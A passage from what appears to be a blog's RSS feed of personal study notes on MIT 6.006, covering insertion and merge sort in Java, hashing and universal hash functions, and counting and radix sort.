    <span class="org-comment-delimiter">// </span><span class="org-comment">Memory usage optimization</span>
    <span class="org-type">int</span> <span class="org-variable-name">temp</span>;
    <span class="org-comment-delimiter">// </span><span class="org-comment">Increase the sorted array size by one for each iteration</span>
    <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">i</span> = 1; i &lt; myArray.length; i++ )
    {
        <span class="org-comment-delimiter">// </span><span class="org-comment">For every element in the 1-i subarray</span>
        <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">l</span> = i; l &gt; 0; l-- )
        {
            <span class="org-comment-delimiter">// </span><span class="org-comment">Swap them if in wrong order</span>
            <span class="org-keyword">if</span> ( myArray[l] &lt; myArray[l-1] )
            {
                temp = myArray[l];
                myArray[l] = myArray[l-1];
                myArray[l-1] = temp;
            }
            <span class="org-keyword">else</span>
                <span class="org-comment-delimiter">// </span><span class="org-comment">Because the array is sorted, no need to continue</span>
                <span class="org-comment-delimiter">// </span><span class="org-comment">till index 1</span>
                <span class="org-keyword">break</span>;
        }
    }
}
</pre>
</div>
</div>
</div>
<div id="outline-container-orge2d0dee" class="outline-4">
<h4 id="orge2d0dee"><span class="section-number-4">4.2.4.</span> <a href="#orge2d0dee">Merge sort</a></h4>
<div class="outline-text-4" id="text-4-2-4">
<p>
<i>Analysis</i>: \(O(n\lg{n})\)
</p>

<p>
This, last algorithm, is the most efficient one in this lecture. It splits the
array in half, recursively, ultimately sorting arrays of length 2, and then
gradually merging them together (in \(O(n)\) time) till they reach the starting
size of the array
</p>
</div>
<ol class="org-ol">
<li><a id="orgdad3884"></a><a href="#orgdad3884">Implementation</a><br>
<div class="outline-text-5" id="text-4-2-4-1">
<div class="org-src-container">
<pre class="src src-java"><span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">mergeSort</span>(<span class="org-type">int</span>[] <span class="org-variable-name">myArray</span>)
{
    mergeSort(0,myArray.length,myArray);
}

<span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">mergeSort</span>(<span class="org-type">int</span> <span class="org-variable-name">startIndex</span>, <span class="org-type">int</span> <span class="org-variable-name">lastIndex</span>, <span class="org-type">int</span>[] <span class="org-variable-name">myArray</span>)
{

    <span class="org-comment-delimiter">// </span><span class="org-comment">Only if there are more than 1 elements can the array be unsorted, otherwise it is</span>
    <span class="org-comment-delimiter">// </span><span class="org-comment">by default, sorted</span>
    <span class="org-keyword">if</span> ( lastIndex - startIndex &gt; 1 )
    {
        <span class="org-type">int</span> <span class="org-variable-name">middleIndex</span> = ( lastIndex + 1 + startIndex ) / 2;
        <span class="org-comment-delimiter">// </span><span class="org-comment">Sort the first half of the subarray</span>
        mergeSort(startIndex, middleIndex, myArray);
        <span class="org-comment-delimiter">// </span><span class="org-comment">Sort the second half of the subarray</span>
        mergeSort(middleIndex, lastIndex, myArray);
        <span class="org-comment-delimiter">// </span><span class="org-comment">Merge sub arrays</span>
        <span class="org-type">int</span> <span class="org-variable-name">A</span>[] = Arrays.copyOfRange(myArray,startIndex,middleIndex);
        <span class="org-type">int</span> <span class="org-variable-name">B</span>[] = Arrays.copyOfRange(myArray,middleIndex,lastIndex);
        merge(A,B,myArray, startIndex, lastIndex);
    }
}

<span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">merge</span> (<span class="org-type">int</span>[] <span class="org-variable-name">firstSubArray</span>, <span class="org-type">int</span>[] <span class="org-variable-name">secondSubArray</span>, <span class="org-type">int</span>[] <span class="org-variable-name">myArray</span>, <span class="org-type">int</span> <span class="org-variable-name">startIndex</span>, <span class="org-type">int</span> <span class="org-variable-name">lastIndex</span>)
{
    <span class="org-type">int</span> <span class="org-variable-name">pointA</span> = firstSubArray.length-1;
    <span class="org-type">int</span> <span class="org-variable-name">pointB</span> = secondSubArray.length-1;
    <span class="org-type">int</span> <span class="org-variable-name">temp</span> = lastIndex;
    <span class="org-keyword">while</span> ( pointA &gt;= 0 || pointB &gt;= 0 )
    {
        <span class="org-keyword">if</span> ( pointB &lt; 0 || (pointA &gt;= 0 &amp;&amp; firstSubArray[pointA] &gt; secondSubArray[pointB] ))
            myArray[--lastIndex] = firstSubArray[pointA--];
        <span class="org-keyword">else</span>
            myArray[--lastIndex] = secondSubArray[pointB--];
    }
    printArray(myArray, startIndex, temp);
}

<span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">printArray</span> ( <span class="org-type">int</span>[] <span class="org-variable-name">myArray</span> )
{
    printArray(myArray,0, myArray.length);
}
<span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">printArray</span> ( <span class="org-type">int</span>[] <span class="org-variable-name">myArray</span>, <span class="org-type">int</span> <span class="org-variable-name">start</span>, <span class="org-type">int</span> <span class="org-variable-name">end</span> )
{
    System.out.printf(<span class="org-string">"Start: %d, End: %d\n"</span>, start,end);
    <span class="org-keyword">while</span> ( start &lt; end )
        System.out.printf(<span class="org-string">"%d "</span>, myArray[start++]);
    System.out.println(<span class="org-string">""</span>);
}
</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
It contains the key in it
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Nice explanation regarding the reason why \(\Omega\) was chosen
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>6.006 Lec 4: Hashing</title>
<link>posts/lectures/mit/6006/6.006-lec-4-hashing.html</link>
<pubDate>Fri, 18 Feb 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/mit/6006/6.006-lec-4-hashing.html</guid>
<description>
<![CDATA[<div id="outline-container-org28baf37" class="outline-2">
<h2 id="org28baf37"><span class="section-number-2">1.</span> <a href="#org28baf37">Lecture notes:</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Professor: Jason Ku</li>
<li>Lecture: <a href="https://www.youtube.com/watch?v=Nu8YGneFCWE&amp;list=PLUl4u3cNGP63EdVPNLG3ToM6LaEUuStEY&amp;index=5">YouTube Link</a></li>
</ul>
</div>
</div>
<div id="outline-container-org716ed41" class="outline-2">
<h2 id="org716ed41"><span class="section-number-2">2.</span> <a href="#org716ed41">Set vs Sequence</a></h2>
<div class="outline-text-2" id="text-2">
<p>
<i>Linking to the previous lecture</i>
</p>

<p>
 It is interesting to note a core difference between sets and sequences. In
sequences, we design the data structure to include extra information regarding
the order in which the elements will be (an extrinsic property). This is more
obvious since functions like <code>get_at(i),set_at(i)</code>, are quite common. However,
in sets the order is an intrinsic property of the object getting stored (the
key)
</p>
</div>
</div>
<div id="outline-container-org91cfef6" class="outline-2">
<h2 id="org91cfef6"><span class="section-number-2">3.</span> <a href="#org91cfef6">Prove that <code>find()</code> can not be faster than \(O(\lg{n})\)</a></h2>
<div class="outline-text-2" id="text-3">
<p>
In the <a href="posts/lectures/mit/6006/6.006-lec-3:-sorting.html">last lecture</a>, we managed to reduce the time needed to find an element in
our data structure from \(O(n)\) to \(O(\lg{n})\)<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, by implementing a sorted array.
Is it somehow possible to make this operation any faster?
</p>

<p>
Well yes&#x2026; but actually, no!<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>

<p>
Let&rsquo;s see it in greater detail
</p>
</div>
<div id="outline-container-orga9b7801" class="outline-3">
<h3 id="orga9b7801"><span class="section-number-3">3.1.</span> <a href="#orga9b7801">The comparison model</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
In the comparison model, the items themselves do not matter ( their value ), but
we use only comparison operations on them to differentiate them ( and sort them
)
</p>

<p>
Every single one of the algorithms found in lecture 3 were following that model.
</p>
</div>
</div>
<div id="outline-container-org88b3e94" class="outline-3">
<h3 id="org88b3e94"><span class="section-number-3">3.2.</span> <a href="#org88b3e94">The decision tree</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
The decision tree is a binary tree, with each node representing a comparison
operation and creating a branch for each of the possible outcomes of the comparison.
</p>

<p>
In the decision tree, the leaves are the possible output values of the function,
which in our case, since we <i>search</i> for a value in a \(n\) sized array, are
\(n+1\), representing each value stored in the array and <code>null</code> for when the value
we search for does not exist in the data structure.
</p>

<p>
We can easily visualize <i>( take a tree with 1 comparison, count leaves, move on
to a tree with 3 comparisons etc )</i> that for the binary tree to have \(n+1\)
different leaves it needs to have a <i>minimum length</i><sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup> of at least
\(\lg{n+1}\), which means that the shortest path that one can take from the root
to a leaf is \(\lg{n+1}\) and thus we have \(\Theta(\lg{n})\)
</p>

<p>
Sadly, that means that a faster than \(O(\lg{n})\) algorithm can not exist in the
comparison model.
</p>
</div>
</div>
</div>
<div id="outline-container-org9ac503a" class="outline-2">
<h2 id="org9ac503a"><span class="section-number-2">4.</span> <a href="#org9ac503a"><code>find()</code> at \(0(1)\)</a></h2>
<div class="outline-text-2" id="text-4">
<p>
What if we want to perform <code>find()</code> faster, though?
</p>

<p>
Thinking about the previous section, it is kind of obvious that in order to
achieve that, we will have to do something different than the comparison model;
we will gain advantage of the actual value, using it as a white-box instead.
</p>
</div>
<div id="outline-container-org480f98c" class="outline-3">
<h3 id="org480f98c"><span class="section-number-3">4.1.</span> <a href="#org480f98c">Static array</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
<i>In this course this technique is often referred to as Direct Access Array</i>
</p>

<p>
We know from the RAM model that access to any specific index in a static array
takes constant time ( O(1) ). If, when dealing with sets, we create an array in
which every item with key \(k\) gets stored at \(x[k]\), <code>find(k)</code> will work at \(O(1)\).
</p>
</div>
</div>
<div id="outline-container-org96d5fbd" class="outline-3">
<h3 id="org96d5fbd"><span class="section-number-3">4.2.</span> <a href="#org96d5fbd">Drawbacks</a></h3>
<div class="outline-text-3" id="text-4-2">
<p>
With relatively no extra work we have managed to implement <code>find(k)</code> at
\(0(1)\)&#x2026; But at what cost?
</p>
</div>
<div id="outline-container-orgbb27bb8" class="outline-4">
<h4 id="orgbb27bb8"><span class="section-number-4">4.2.1.</span> <a href="#orgbb27bb8">What if we deal with huge key values</a></h4>
<div class="outline-text-4" id="text-4-2-1">
<p>
Not talking about \(n\) but about the keys. The array we create to store our
data needs to have at least so many indeces as the highest key value, meaning
that if we were dealing with a key value of \(h=123122412341234134\), the array
would have to have space for \(h\) elements ! That is even if \(n\) was 5, meaning
that we would also have to deal with many empty entries.
</p>

<p>
<i>An example of that would be linking telephone numbers(key) to users</i>
</p>

<p>
Mapping each telephone number to the user might seem very easy with this
technique. We would easily be able to access <code>catalogue[phoneNo]</code> and get the
user, however there is a small catch: since phone numbers have 10 digits the
array would need to be of size O(10<sup>10</sup>)!
</p>
</div>
</div>
<div id="outline-container-org4dad50d" class="outline-4">
<h4 id="org4dad50d"><span class="section-number-4">4.2.2.</span> <a href="#org4dad50d">Limitation regarding the key values that can be stored</a></h4>
<div class="outline-text-4" id="text-4-2-2">
<p>
Think of the registers of size w, so we can use \(2^w\) number of addresses<sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup>
</p>
</div>
</div>
<div id="outline-container-org974485c" class="outline-4">
<h4 id="org974485c"><span class="section-number-4">4.2.3.</span> <a href="#org974485c">Same keys?</a></h4>
<div class="outline-text-4" id="text-4-2-3">
<p>
We assume that all of our keys are unique. In this implementation there is no
way to deal with collisions.
</p>
</div>
</div>
</div>
<div id="outline-container-org965fcd3" class="outline-3">
<h3 id="org965fcd3"><span class="section-number-3">4.3.</span> <a href="#org965fcd3">Improving on that model</a></h3>
<div class="outline-text-3" id="text-4-3">
</div>
<div id="outline-container-orga77363a" class="outline-4">
<h4 id="orga77363a"><span class="section-number-4">4.3.1.</span> <a href="#orga77363a">Using less space</a></h4>
<div class="outline-text-4" id="text-4-3-1">
<p>
Since most of our problems with the previous structure are associated with its
enormous size, it is vital to reduce the space needed for it. To do that we will
need a function \(h\), that is to map our keys (belonging to a range of
\(\{1,2,\cdots,u-1\}\)) to a smaller range \(\{0,1,2,\cdots,m-1\}\).
</p>

\begin{equation}
h:\{1,2,\cdots,u-1\}to \{0,1,2,\cdots,m-1\}
\end{equation}

<p>
The array that is the result of this operation is called <span class="underline">the hash table</span>
</p>
</div>
<ol class="org-ol">
<li><a id="org1c0c798"></a><a href="#org1c0c798">The pigeonhole principle</a><br>
<div class="outline-text-5" id="text-4-3-1-1">
<p>
That seems fantastic, dealing effectively with our unused space problem. Another
problem arises, though. Depending on the number \(m\) that we choose, the
possibility of a collision arises, and <i>obviously</i> becomes a certainty if
\(m\leq n\)
</p>


<p>
The possibility of collisions, also varies with the hashing function, making the
usage of a right hashing method imperative for our model to function.
</p>
</div>
</li>
</ol>
</div>
<div id="outline-container-org9c47517" class="outline-4">
<h4 id="org9c47517"><span class="section-number-4">4.3.2.</span> <a href="#org9c47517">Solving the duplicate keys problem</a></h4>
<div class="outline-text-4" id="text-4-3-2">
<p>
Two solutions:
</p>
</div>
<ol class="org-ol">
<li><a id="orgf832527"></a><a href="#orgf832527">Open addressing</a><br>
<div class="outline-text-5" id="text-4-3-2-1">
<p>
<i>notoriously difficult to analyze</i>
</p>
</div>
</li>
<li><a id="org9a9a98e"></a><a href="#org9a9a98e">The chaining idea</a><br>
<div class="outline-text-5" id="text-4-3-2-2">
<p>
At collision, add a pointer to another data structure (presumably a linked
list), effectively mapping each key \(x[k]\to\) a structure containing all
elements with that key. It is vital that these data structures are kept sort,
otherwise we will not benefit from the \(O(1)\) access.
</p>

<p>
If collisions are optimally distributed amongst the indeces (which is what
the hash function must perform), then the length of the <i>chain</i> data
structure will be given by:
</p>

\begin{equation}
l = \frac{n}{m} = \frac{n}{\Omega{n}} = O(1)
\end{equation}

<p>
And if that is true, then we can access every index in \(O(1)\) time.
</p>
</div>
</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-orgada8278" class="outline-2">
<h2 id="orgada8278"><span class="section-number-2">5.</span> <a href="#orgada8278">Picking the <i>right</i> hash function</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Collisions are <i>in general</i> unavoidable. The only thing that one can do to get
away is to select \(m\) and the hashing function appropriately
</p>
</div>
<div id="outline-container-org6c0f232" class="outline-3">
<h3 id="org6c0f232"><span class="section-number-3">5.1.</span> <a href="#org6c0f232">The divmod method</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
An example of a hash function is the following:
</p>
\begin{equation}
h(k) = k\mod{m}
\end{equation}

<p>
This is the <span class="underline">deterministic</span> approach to hashing, because the function is already
hard coded and there will, unfortunately, be a certain type of input for which
the function will not perform well
</p>
</div>
<div id="outline-container-org41206bf" class="outline-4">
<h4 id="org41206bf"><span class="section-number-4">5.1.1.</span> <a href="#org41206bf">Additional methods</a></h4>
<div class="outline-text-4" id="text-5-1-1">
<p>
<i>These are not discussed in the lecture, taken from A.U.Th course</i>
</p>
<ul class="org-ul">
<li>Midsquare
Compute the square of the key and get the \(m\) middle digits</li>
<li>Digit Extraction
<i>Needs careful examination, may not be useful under certain
circumstances</i> Given an \(m\) number of digits (\(m_{1},m_2,\cdots\)) return the
keys digits at these places</li>
<li>Folding
<ul class="org-ul">
<li>Shift Fold</li>
<li>Mirror Fold</li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org0b02695" class="outline-3">
<h3 id="org0b02695"><span class="section-number-3">5.2.</span> <a href="#org0b02695">The Universal Hashing Functio<sup><a id="fnr.5" class="footref" href="#fn.5" role="doc-backlink">5</a></sup>n</a></h3>
<div class="outline-text-3" id="text-5-2">
<p>
Instead of using a single function, it is possible to fix a family of them,
something that  we refer to as a UHF<sup><a id="fnr.6" class="footref" href="#fn.6" role="doc-backlink">6</a></sup>, to avoid the error presented above:
having a predefined particular set of inputs that breaks our program.
</p>

<p>
For \(a,b\in \{0,\cdots,p-1\}\), an <i>improved</i> hashing function would be:
</p>
\begin{equation}
h_{ab}(k)=(((ak+b)\mod{p})\mod{m})
\end{equation}

<p>
And the family that we could use would be:
</p>
\begin{equation}
H(p,m)=\{h_{ab}(k)|a,b\in\{0,\cdots,p-1\}, a\neq0\}
\end{equation}

<p>
The <i>universal</i> part means that the collision probability is reduced and
therefore, the chain lengths are kept sort. More specifically, if we use the
<i>boolean</i> \(X_{ij}\) to inform us whether \(h(k_{i})=h(k_{j})\), the expected chain
length will be given by, and \(X_{i}\) to be the length of the chain:
</p>
\begin{align}
Pr_{h\in H}\{h(k_i)&=h(k_j)\} \leq \frac{1}{m} \forall k_i\neq k_j\\
E_{h\in{H}}\{X_{i}\} &= E_{h\in{H}}\sum_{j=0}^{n-1}X_{ij} = \cdots \leq 1+\frac{n-1}{m}
\end{align}
</div>
</div>
</div>
<div id="outline-container-orgaaf73cf" class="outline-2">
<h2 id="orgaaf73cf"><span class="section-number-2">6.</span> <a href="#orgaaf73cf">Dynamic allocation</a></h2>
<div class="outline-text-2" id="text-6">
<p>
Combining that with what we discussed in previous lectures about dynamic arrays,
we can optimize it for quick insertions/deletions, and low unused space. This
way, cost can be <span class="underline">amortized</span>.
</p>
</div>
</div>
<div id="outline-container-org59a0da2" class="outline-2">
<h2 id="org59a0da2"><span class="section-number-2">7.</span> <a href="#org59a0da2">Summary</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Hashing is a technique, used to organize the input data, getting large integers
and mapping them to smaller ones to save space, or getting other types of keys
(Strings for example) and mapping them to integers, so that a hash table can be
used.
</p>


<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">data structure</th>
<th scope="col" class="org-left">&#xa0;</th>
<th scope="col" class="org-left">build(X)</th>
<th scope="col" class="org-left">find(k)</th>
<th scope="col" class="org-left">insert(x), delete(k)</th>
<th scope="col" class="org-left">find<sub>min</sub>/max()</th>
<th scope="col" class="org-left">find<sub>prev</sub>/next(k)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Array</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">n</td>
<td class="org-left">n</td>
<td class="org-left">n</td>
<td class="org-left">n</td>
<td class="org-left">n</td>
</tr>

<tr>
<td class="org-left">Sorted Array</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">nlogn</td>
<td class="org-left">logn</td>
<td class="org-left">n</td>
<td class="org-left">1</td>
<td class="org-left">1</td>
</tr>

<tr>
<td class="org-left">Direct Access Array</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">u</td>
<td class="org-left">1<sub>ea</sub></td>
<td class="org-left">1</td>
<td class="org-left">u</td>
<td class="org-left">u</td>
</tr>

<tr>
<td class="org-left">Hash Table</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">n<sub>e</sub></td>
<td class="org-left">1<sub>ae</sub></td>
<td class="org-left">1<sub>ae</sub></td>
<td class="org-left">n</td>
<td class="org-left">n</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
There a \(O(\lg{\lg{n}})\) algorithm.
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I&rsquo;m sorry
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
The terminology might not be exactly right
</p></div></div>

<div class="footdef"><sup><a id="fn.4" class="footnum" href="#fnr.4" role="doc-backlink">4</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
This, interestingly, links to <a href="https://www.amazon.com/gp/product/B00G4N7I2K/ref=dbs_a_def_rwt_bibl_vppi_i0">Patterson,Henessy2013</a>
</p></div></div>

<div class="footdef"><sup><a id="fn.5" class="footnum" href="#fnr.5" role="doc-backlink">5</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Can also be found as uniform hashing function, since the keys are equally
distributed among the hash table slots
</p></div></div>

<div class="footdef"><sup><a id="fn.6" class="footnum" href="#fnr.6" role="doc-backlink">6</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Universal is a descriptor here not <span class="underline">the universal</span>
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>6.006 Lec 5: Linear Sorting</title>
<link>posts/lectures/mit/6006/6.006-lec-5-linear-sorting.html</link>
<pubDate>Sat, 19 Feb 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/mit/6006/6.006-lec-5-linear-sorting.html</guid>
<description>
<![CDATA[<div id="outline-container-org0a976e0" class="outline-2">
<h2 id="org0a976e0"><span class="section-number-2">1.</span> <a href="#org0a976e0">Lecture details:</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Professor: Jason Kun</li>
<li>Lecture: <a href="https://www.youtube.com/watch?v=yndgIDO0zQQ&amp;list=PLUl4u3cNGP63EdVPNLG3ToM6LaEUuStEY&amp;index=7">YouTube Link</a></li>
</ul>
</div>
<div id="outline-container-orga1f1abf" class="outline-3">
<h3 id="orga1f1abf"><span class="section-number-3">1.1.</span> <a href="#orga1f1abf">Note</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
This lecture seemed full of gaps to me. Only through the lecture and rescitation
notes did I understand the topics discussed.
</p>
</div>
</div>
</div>
<div id="outline-container-org9fc1cb8" class="outline-2">
<h2 id="org9fc1cb8"><span class="section-number-2">2.</span> <a href="#org9fc1cb8">Introduction</a></h2>
<div class="outline-text-2" id="text-2">
<p>
In lecture 3, we discussed sorting algorithms based on the comparison model. We
saw however, that using similar-to-hash functions we can move from the comparison to the
word RAM model and take advantage of \(O(1)\) access.
</p>
</div>
</div>
<div id="outline-container-org49ebee4" class="outline-2">
<h2 id="org49ebee4"><span class="section-number-2">3.</span> <a href="#org49ebee4">Sorting</a></h2>
<div class="outline-text-2" id="text-3">
<p>
In the comparison model, the <code>find(k)</code> operation has \(n+1\) possible output
items while the <code>sort()</code> function has \(n!\) possible outputs, the \(n!\)
permutations of the array, some of which will be sorted.
</p>

<p>
If we followed the decision tree approach, with the number of leaves for the
sorting operation being \(n!\), there would be a need of \(O(\lg{n!})\) operations.
Building on that<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>
\begin{align}
n! = n * n-1 * n-2 * \cdots >= n^{n/2}\\
O(\lg{n!}) \to \Omega(n\lg{n})
\end{align}
</div>
<div id="outline-container-orgead2627" class="outline-3">
<h3 id="orgead2627"><span class="section-number-3">3.1.</span> <a href="#orgead2627">Direct Access Array Sort</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Instantiante a big access array and store every item <code>x</code> in the <code>x.key</code> slot.
Then walk down the array (iterate through it), returning the items in their
existing order.
</p>

<p>
With the <span class="underline">requirement</span> that each key is unique we have:
</p>
<div class="org-src-container">
<pre class="src src-java">&lt;<span class="org-type">type</span>&gt;[] directAccessSort(&lt;<span class="org-type">type</span>&gt;[] inputArray)
{
   <span class="org-comment-delimiter">// </span><span class="org-comment">Find the maximum key value</span>
   <span class="org-type">int</span> <span class="org-variable-name">maxKey</span> = inputArray[0].key;
   <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">l</span> = 1; l &lt; inputArray.length; l++ ) <span class="org-comment-delimiter">// </span><span class="org-comment">compute max key in O(n)</span>
       maxKey = max(maxKey, inputArray[l].key);

   &lt;<span class="org-type">type</span>&gt;[] tempArray = <span class="org-keyword">new</span> &lt;<span class="org-type">type</span>&gt;[u];
   <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">l</span> = 0; l &lt; inputArray.length; l++ ) <span class="org-comment-delimiter">// </span><span class="org-comment">O(n), again</span>
       <span class="org-comment-delimiter">// </span><span class="org-comment">Move each x to output[x.key]</span>
       <span class="org-comment-delimiter">// </span><span class="org-comment">collisions can not occur since input keys are unique</span>
       tempArray[inputArray[l].key] = inputArray[l];

   <span class="org-comment-delimiter">// </span><span class="org-comment">Now, create the array to be returned (size n), and fill it with</span>
   <span class="org-comment-delimiter">// </span><span class="org-comment">the items in sorted order</span>
   &lt;<span class="org-type">type</span>&gt;[] outputArray = <span class="org-keyword">new</span> &lt;<span class="org-type">type</span>&gt;[n];
   <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">l</span> = 0,<span class="org-variable-name">i</span> = 0; l &lt; u; l++) <span class="org-comment-delimiter">// </span><span class="org-comment">O(u)</span>
   {
       <span class="org-keyword">if</span> ( tempArray[l] != <span class="org-constant">null</span> )
           outputArray[i++] = tempArray[l];
   }

   <span class="org-keyword">return</span> outputArray;
}
</pre>
</div>

<p>
It is obvious that the complexity of this algorithm is \(O(n+u)\), which means
that, the running time can be \(O(n)\) if \(u = O(n)\), however, it can also become
\(O(n^{1232})\), if \(u\) is in that range and we can not allow that to happen.
</p>
</div>
</div>
<div id="outline-container-orgbb67e49" class="outline-3">
<h3 id="orgbb67e49"><span class="section-number-3">3.2.</span> <a href="#orgbb67e49">Tuple sort</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
What if we <i>split</i> the key values though?
</p>

<p>
This way we can associate each item with a tuple of constant length<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>, and
sort the entries lexicographically, sorting for each key from the least to the
most significant one. <b>The algorithm must be stable</b>.
</p>

<p>
<i>From here on we assume that the tuples are of length two. It is not necessary</i>
Write every item as tuples, using <code>divmod()</code>, with each key in the form of
<code>(a,b)</code>:
</p>
<div class="org-src-container">
<pre class="src src-python"><span class="org-variable-name">a</span>,<span class="org-variable-name">b</span> <span class="org-operator">=</span> <span class="org-builtin">divmod</span>(k,n)
</pre>
</div>

<p>
In this algorithm we repeatedly sort the array, sorting first by the least
significant number and then moving on to the more significant one. Here is
where <span class="underline">stable</span> sorting algorithms come into play: If the stable algorithm can
not <i>differentiate</i> between two items, the order that the items have in input is kept.
</p>
</div>
<div id="outline-container-org4315cae" class="outline-4">
<h4 id="org4315cae"><span class="section-number-4">3.2.1.</span> <a href="#org4315cae">Counting sort</a></h4>
<div class="outline-text-4" id="text-3-2-1">
<p>
In this <b>stable</b> algorithm, given an array \(A\) we put every item in \(x\in A\) in a
dynamic structure at <code>B[x.key]</code>. Then we iterate through \(B\), returning the
items in a <i>FIFO</i> order.
</p>

<div class="org-src-container">
<pre class="src src-python"><span class="org-keyword">def</span> <span class="org-function-name">counting_sort</span>(A):
    <span class="org-doc">"Sort A assuming items have non-negative keys"</span>
    <span class="org-variable-name">u</span> <span class="org-operator">=</span> 1 <span class="org-operator">+</span> <span class="org-builtin">max</span>([x.key <span class="org-keyword">for</span> x <span class="org-keyword">in</span> A])      <span class="org-comment-delimiter"># </span><span class="org-comment">O(n) find maximum key</span>
    <span class="org-variable-name">B</span> <span class="org-operator">=</span> [[] <span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(u)]           <span class="org-comment-delimiter"># </span><span class="org-comment">O(u) direct access array of chains</span>
    <span class="org-keyword">for</span> x <span class="org-keyword">in</span> A:                         <span class="org-comment-delimiter"># </span><span class="org-comment">O(n) insert into chain at x.key</span>
        B[x.key].append(x)              <span class="org-comment-delimiter"># </span><span class="org-comment">O(1), insertion at end</span>
    <span class="org-variable-name">i</span> <span class="org-operator">=</span> 0
    <span class="org-keyword">for</span> chain <span class="org-keyword">in</span> B:                     <span class="org-comment-delimiter"># </span><span class="org-comment">O(u) read out items in order</span>
        <span class="org-keyword">for</span> x <span class="org-keyword">in</span> chain:
            <span class="org-variable-name">A</span>[i] <span class="org-operator">=</span> x
            <span class="org-variable-name">i</span> <span class="org-operator">+=</span> 1
</pre>
</div>
</div>
</div>
<div id="outline-container-orgf792d58" class="outline-4">
<h4 id="orgf792d58"><span class="section-number-4">3.2.2.</span> <a href="#orgf792d58">Why is that faster?</a></h4>
<div class="outline-text-4" id="text-3-2-2">
<p>
Even though it does not look much different to <a href="#orgead2627">DAA Sort</a>, counting sort handles
collisions, meaning that we have now no problem dealing with sets containing
duplicate keys.
</p>

<p>
This is critical, because it enables the idea behind tuple sort to come into
reality using repeated calls to the <code>counting_sort(A)</code> function. That
implementation of tuple sort is called:
</p>
</div>
</div>
</div>
<div id="outline-container-orgb9b71ae" class="outline-3">
<h3 id="orgb9b71ae"><span class="section-number-3">3.3.</span> <a href="#orgb9b71ae">Radix Sort</a></h3>
<div class="outline-text-3" id="text-3-3">
<div class="org-src-container">
<pre class="src src-python"><span class="org-keyword">def</span> <span class="org-function-name">radix_sort</span>(A):
    <span class="org-doc">"Sort A assuming items have non-negative keys"</span>
    <span class="org-variable-name">n</span> <span class="org-operator">=</span> <span class="org-builtin">len</span>(A)
    <span class="org-variable-name">u</span> <span class="org-operator">=</span> 1 <span class="org-operator">+</span> <span class="org-builtin">max</span>([x.key <span class="org-keyword">for</span> x <span class="org-keyword">in</span> A])                         <span class="org-comment-delimiter"># </span><span class="org-comment">O(n) find maximum key</span>
